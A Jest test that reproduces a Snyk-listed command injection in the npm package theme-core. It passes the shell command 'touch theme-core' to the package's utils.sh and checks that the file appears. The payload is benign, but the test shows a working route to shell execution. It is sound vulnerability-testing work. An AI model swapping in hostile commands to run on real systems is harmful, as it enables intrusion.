//https://snyk.io/vuln/SNYK-JS-THEMECORE-1050425
test("Command Injection in theme-core", (done) => {
  expect.assertions(2);
  const a = require("theme-core");
  const fs = require("fs");
  const path = "./theme-core";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.utils.sh("touch theme-core", true, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  });
});
